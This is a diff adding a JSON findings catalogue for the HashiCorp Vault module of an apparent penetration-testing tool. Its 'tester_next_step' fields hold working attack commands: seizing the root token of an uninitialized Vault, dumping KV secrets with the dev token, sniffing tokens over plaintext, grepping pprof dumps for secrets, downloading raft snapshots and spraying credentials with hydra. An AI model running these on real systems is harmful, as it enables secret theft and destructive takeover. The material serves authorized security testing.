@@ -1,0 +1,121 @@
+{
+  "service": "vault",
+  "summary": "Vault module has real depth: unauth surface findings (uninitialized, dev-mode, plaintext listener, pprof/metrics) are true T1s; authed walk (mounts, auth backends, KV read, raft snapshot HEAD) reaches T2/T3 when a token is supplied \u2014 it actually reads plaintext KV secrets and folds them into known_credentials/users/hostnames. Uninitialized is currently T1 (safe check only) but a T2 probe POST would seize the root token \u2014 the biggest promotion available. Raft snapshot is HEAD-only (safe); an actual snapshot download would be T3 initial access (attacker-decryptable BoltDB). CVE detection is version-gated with a small verified whitelist.",
+  "module_files": [
+    "recce/services/vault.py"
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_hostnames",
+    "known_users",
+    "known_credentials",
+    "relay_targets",
+    "known_domains"
+  ],
+  "findings": [
+    {
+      "kind": "vault_reachable",
+      "title_pattern": "Vault endpoint reachable",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "Version/seal/init/HA fingerprint from /v1/sys/seal-status.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Enum-only baseline.",
+      "tester_next_step": "curl -sk https://<ip>:8200/v1/sys/seal-status; note version \u2192 check HCSEC bulletins."
+    },
+    {
+      "kind": "vault_uninitialized",
+      "title_pattern": "Vault uninitialized - attacker-controlled initialization race",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "GET /v1/sys/init returned initialized=false \u2014 safe read, no POST attempted.",
+      "can_promote_to": "t3",
+      "promotion_risk": "destructive",
+      "promotion_notes": "T3 = POST /v1/sys/init with {secret_shares:1,secret_threshold:1} to seize the root token + unseal share. First-writer-wins so this permanently locks the operator out. Must be gated behind --exploit --destructive.",
+      "tester_next_step": "# DESTRUCTIVE: curl -sk -X POST -d '{\"secret_shares\":1,\"secret_threshold\":1}' https://<ip>:8200/v1/sys/init \u2192 capture root_token + unseal_keys_b64[0]; then vault unseal + VAULT_TOKEN=<root> vault kv list."
+    },
+    {
+      "kind": "vault_dev_mode",
+      "title_pattern": "Vault running in dev mode (root token 'root', in-memory storage)",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "sealed=false + storage_type='inmem' signature of `vault server -dev` \u2014 inference, not a login attempt.",
+      "can_promote_to": "t3",
+      "promotion_risk": "low",
+      "promotion_notes": "T3 = actually POST X-Vault-Token: root against /v1/sys/mounts; a 200 confirms full compromise and can drive the full authed walk automatically. Non-destructive.",
+      "tester_next_step": "curl -sk -H 'X-Vault-Token: root' https://<ip>:8200/v1/sys/mounts; if 200, VAULT_ADDR=https://<ip>:8200 VAULT_TOKEN=root vault kv list secret/ and dump everything."
+    },
+    {
+      "kind": "vault_unsealed_no_tls",
+      "title_pattern": "Vault unsealed over plaintext HTTP (tls_disable=true)",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "Detected via http_and_tls dual-listener test + used_tls=False path \u2014 deterministic.",
+      "can_promote_to": "t3",
+      "promotion_risk": "high",
+      "promotion_notes": "T3 = passive on-path capture of X-Vault-Token headers via tcpdump/bettercap on the segment; each captured token replays for whatever ACL it holds. Requires L2 access to the segment.",
+      "tester_next_step": "tcpdump -i any -A -s0 'tcp port 8200 and host <ip>' | grep -iE 'X-Vault-Token|s\\.[A-Za-z0-9]{24,}' \u2014 grab any client token then curl https://<ip>:8200/v1/sys/mounts -H 'X-Vault-Token: <captured>'."
+    },
+    {
+      "kind": "vault_debug_disclosure",
+      "title_pattern": "Vault debug / metrics endpoints reachable unauthenticated",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "pprof/goroutine body length > 100 + metrics body contains 'vault'.",
+      "can_promote_to": "t2",
+      "promotion_risk": "low",
+      "promotion_notes": "T2 = pull full goroutine/heap dump and grep for in-memory secret material (unseal shards, token fragments). Known Vault issue class.",
+      "tester_next_step": "curl -sk 'https://<ip>:8200/v1/sys/pprof/goroutine?debug=2' -o goroutine.txt; grep -aiE 'unseal|token|secret|password|s\\.[A-Za-z0-9]{24,}' goroutine.txt; also fetch /v1/sys/pprof/heap."
+    },
+    {
+      "kind": "vault_authed_mounts",
+      "title_pattern": "Vault authenticated - mounts and auth backends enumerated",
+      "severity": "medium",
+      "tier": "t2",
+      "tier_evidence": "Supplied token actually authorised \u2014 /v1/sys/mounts returned 200 \u2192 real proof of foothold on the token's scope.",
+      "can_promote_to": "t3",
+      "promotion_risk": "low",
+      "promotion_notes": "T3 already reached by companion vault_authed_secret_read + vault_raft_snapshot_dump. Enrich by also fetching /v1/sys/policies and /v1/auth/*/users to know what else the token unlocks.",
+      "tester_next_step": "VAULT_ADDR=https://<ip>:8200 VAULT_TOKEN=<t> vault token lookup; vault policy list; vault auth list; then vault kv list on each kv mount."
+    },
+    {
+      "kind": "vault_authed_secret_read",
+      "title_pattern": "Vault KV secret dump succeeded - plaintext secrets returned",
+      "severity": "critical",
+      "tier": "t3",
+      "tier_evidence": "Actual KV data returned + folded into known_credentials/users \u2014 this is initial access, plaintext secret material captured.",
+      "can_promote_to": "t4",
+      "promotion_risk": "low",
+      "promotion_notes": "T4 = replay captured KV creds automatically against SSH/SMB/MSSQL/PostgreSQL/database services via the credential-store spray loop. Wiring exists (facts.credentials) but downstream sprayers may not yet consume vault-kv:* source.",
+      "tester_next_step": "For each captured vault-kv credential: hydra -L <users> -P <pw> ssh://<ip>; smbclient -L -U user%pass //<ip>; test each disclosed URL/hostname for reuse."
+    },
+    {
+      "kind": "vault_raft_snapshot_dump",
+      "title_pattern": "Vault raft snapshot reachable - full storage dump available",
+      "severity": "critical",
+      "tier": "t2",
+      "tier_evidence": "HEAD returned 200/204 + content-length \u2014 proof root/sudo capability exists, but the actual snapshot isn't downloaded (would be many GB).",
+      "can_promote_to": "t3",
+      "promotion_risk": "medium",
+      "promotion_notes": "T3 = GET the full snapshot (potentially huge); offline it's a gzipped BoltDB with all Vault storage \u2014 every KV secret, policy, auth config. Decryptable if the master key can be recovered from the same host.",
+      "tester_next_step": "curl -sk -H 'X-Vault-Token: <root>' https://<ip>:8200/v1/sys/storage/raft/snapshot -o vault.snap; then vault operator raft snapshot inspect vault.snap; strings vault.snap | grep -iE 'password|token|secret'."
+    },
+    {
+      "kind": "vault_cve",
+      "title_pattern": "Vault <ver> affected by CVE-XXXX-XXXXX",
+      "severity": "high",
+      "tier": "t0",
+      "tier_evidence": "Version-string range match against HCSEC bulletin whitelist \u2014 no live exploit sent.",
+      "can_promote_to": "t2",
+      "promotion_risk": "high",
+      "promotion_notes": "Per-CVE PoC (e.g. CVE-2020-16250 AWS IAM signature bypass) would need a crafted login attempt; risky and CVE-specific.",
+      "tester_next_step": "For CVE-2020-16250/16251: attempt vault write auth/aws/login role=<r> iam_http_request_method=POST ...  with a spoofed X-Vault-AWS-IAM-Server-ID header \u2014 see HCSEC-2020-18 PoC.",
+      "related_cves": [
+        "CVE-2020-16250",
+        "CVE-2020-16251",
+        "CVE-2021-3024",
+        "CVE-2023-25000"
+      ]
+    }
+  ]
+}
